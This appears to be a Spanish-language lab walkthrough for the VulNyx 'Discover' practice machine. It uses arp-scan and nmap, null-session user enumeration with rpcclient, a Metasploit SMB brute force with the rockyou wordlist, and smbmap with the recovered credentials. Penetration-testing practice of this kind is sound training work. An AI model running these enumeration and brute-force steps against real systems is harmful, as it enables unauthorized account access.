Maquina que vamos a utilizar **Kali Linux y Discover** [https://vulnyx.com/#discover](https://vulnyx.com/#discover)

  

> [!important] Aunque el protocolo **SMB** y el Samba corren por el mismo **puerto 445** no son lo mismo.
> 
> El protocolo **Samba** es una implementación libre del protocolo SMB (Server Message Block), que permite **compartir** archivos, impresoras y otros recursos **en redes entre sistemas Windows y Unix/Linux**. Samba facilita la comunicación entre dispositivos de diferentes plataformas, permitiendo que sistemas basados en Unix actúen como servidores o clientes en redes Windows.  
>   

  

En el momento que nos encontremos con el puerto 445 abierto o SAMBA funcionando, debemos de utilizar una **herramienta** conocida como **RPCCLIENT** para tratar de enumerar usuarios existentes dentro de la máquina objetivo.

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 45.png|image 45.png]]

  

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.17
```

![[Imagenes/image 1 34.png|image 1 34.png]]

  

- Empezamos con la **premisa que esta vez no tenemos usuarios ni contraseñas**.
- Utilizamos la **herramienta rpcclient.**
    
    `rpcclient -U "" -N 10.0.3.17`
    
    ![[Imagenes/image 2 33.png|image 2 33.png]]
    
    Se nos muestra un prompt. Debemos conocer tres comandos importantes que podemos utilizar aquí:
    
    > [!important]
    > 
    > - `**srvinfo**`: Este comando proporciona **información** sobre el servidor remoto, como el **sistema operativo, el nombre del servidor y otros detalles relevantes.** Es útil para obtener una visión general del sistema objetivo.
    > - `**querydispinfo**`: Este comando **enumera** información sobre los **usuarios del dominio**, como nombres de usuario y descripciones. Es útil para identificar cuentas activas en el sistema.
    > - `**enumdomusers**`: Este comando **enumera todos los usuarios del dominio**. Es una forma eficaz de obtener una lista completa de las cuentas de usuario en el sistema remoto.
    
    ![[Imagenes/image 3 32.png|image 3 32.png]]
    
    **Ya tengo los usuarios.**
    

  

- Vamos a usar Metasploit para hacer un ataque de fuerza bruta al puerto 445.
    
    Vamos a usar el scanner `scanner/smb/smb_login`
    
      
    
    - `use scanner/smb/smb_login`
        
        ![[Imagenes/image 4 31.png|image 4 31.png]]
        

- `show options`
    
    ![[Imagenes/image 5 30.png|image 5 30.png]]
    

  

- `set RHOSTS 10.0.3.17`
- `set PASS_FILE /usr/share/wordlists/rockyou.txt`
- `set VERBOSE false`
- `set SMBUser ken`
- `show options`
    
    ![[Imagenes/image 6 28.png|image 6 28.png]]
    

  

- `run`
    
    ![[Imagenes/image 7 26.png|image 7 26.png]]
    

  

- Una vez que ya tenemos el usuario y contraseña en un terminal usamos la **herramienta smbmap.**
    
    ```Bash
    smbmap -u 'ken' -p 'kenken' -H 10.0.3.17
    ```
    
    ![[Imagenes/image 8 24.png|image 8 24.png]]
    

```Bash
smbmap -u 'ken' -p 'kenken' -H 10.0.3.17 -r ken
```

![[Imagenes/image 9 22.png|image 9 22.png]]